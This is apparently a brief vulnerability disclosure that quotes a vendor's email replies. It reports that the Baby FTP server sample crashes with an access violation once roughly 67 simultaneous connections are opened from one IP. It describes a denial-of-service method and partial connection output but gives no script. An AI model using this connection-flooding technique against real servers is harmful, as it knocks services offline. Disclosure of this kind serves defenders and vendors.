Hi,

Thanks you very much for your report.
First let me say that BabyFtp server, Baby web server, Baby Pop3 server are
NOT real products but just (MFC) sample applications!
They contain even more bugs than you can think of...
As for Quick 'n Easy FTP server: can you make more connections than
configured in 'Max connections' settings?
If so how did you manage to do that?

Regards,
Pablo


Ok, thanks!
It looks like this is related to the size of physical memory, when new
sockets are created in virtual memory it will crash the application... :(
I will take a look at it first thing tomorrow morning.

Regards and keep on hacking...
Pablo

(2)
Let's try to establish about 100 connections with the webserver from the same IP:

1 220 Welcome to Baby Ftp server
2 220 Welcome to Baby Ftp server
3 220 Welcome to Baby Ftp server
             .
             .
             .
             .
67 220 Welcome to Baby Ftp server          

b00m..crash:>

The error message will be: "Unhanled exception(MFC42.DLL):0xC00000005:Access Violation




^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
